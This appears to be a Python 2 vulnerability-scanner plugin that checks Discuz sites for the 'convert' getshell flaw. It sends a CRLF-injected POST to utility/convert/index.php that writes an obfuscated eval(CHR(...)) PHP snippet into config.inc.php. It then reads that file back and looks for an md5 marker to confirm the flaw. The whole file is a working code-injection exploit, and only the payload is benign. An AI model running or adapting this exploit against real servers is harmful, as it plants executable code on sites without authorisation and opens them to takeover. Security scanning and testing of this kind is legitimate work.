#!/usr/bin/python
# -*- coding: utf-8 -*-
from lib.common import *
import httplib2
import urlparse
import re
import logging

def GetDir(url):
    try:
        parse=urlparse.urlparse(url)
        urls=parse.path
        if urls=="" or urls=="/":
            return url
        urls=url.split("/")
        urls=urls[len(urls)-1]
        if urls=="" or urls.find(".")<0:
            return url
        else:
            return False     
    except Exception,e:
        logging.getLogger().error("discuzcoventgetshell.getdir() Exception(discuzconvertgetshell.py):" + str(e))
        return False
        
def run_url(http,ob,item):
    list=[]
    detail=""
    http=httplib2.Http()
    try:
        url=GetDir(item['url'])
        if url:
            headers={"Host": ob['domain'],"User-Agent": "Mozilla/5.0 (Windows NT 5.1; rv:17.0) Gecko/20100101 Firefox/17.0","Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8","Accept-Language": "zh-cn,zh;q=0.8,en-us;q=0.5,en;q=0.3","Accept-Encoding": "gzip, deflate","Connection": "keep-alive","Content-Type": "application/x-www-form-urlencoded"}
            expurl="%s/%s"%(url,"utility/convert/index.php")
            aduiturl="%s/%s"%(url,"utility/convert/data/config.inc.php")
            data="a=config&source=d7.2_x2.0&submit=yes&newconfig%5Bsource%5D%5Bdbhost%5D=localhost&newconfig%5Baaa%0D%0A%0D%0Aeval%28CHR%28112%29.CHR%28114%29.CHR%28105%29.CHR%28110%29.CHR%28116%29.CHR%2832%29.CHR%28109%29.CHR%28100%29.CHR%2853%29.CHR%2840%29.CHR%2851%29.CHR%2851%29.CHR%2851%29.CHR%2841%29.CHR%2859%29%29%3B%2F%2F%5D=localhost"
#           response,content=http.request(expurl,"POST",data,headers)
#           r,c=http.request(aduiturl)
            response,content=yx_httplib2_request(http,expurl,"POST",data,headers)
            r,c=yx_httplib2_request(http,aduiturl)
            if  c.find("310dcbbf4cce62f762a2aaa148d556bd")>=0:
                if ob['isstart']=="1":
                    detail="验证性扫描结果：%s"%(aduiturl)
                #end if 
                
                request=postRequest(expurl,"POST",headers,data)
                response = getResponse(response)
                list.append(getRecord(ob,expurl,ob['level'],detail,request,response))
    except Exception,e:
        logging.getLogger().error("File:discuzconvertgetshell.py run_domain function :" + str(e) + ",task id:" + ob['task_id'] + ",domain id:" + ob['domain_id'])
        write_scan_log(ob['task_id'],ob['domain_id'],"File:discuzconvertgetshell.py, run_url function :" + str(e))
    #end try
    
    return list
        
 
 
 
 
 
 
 
 
 
 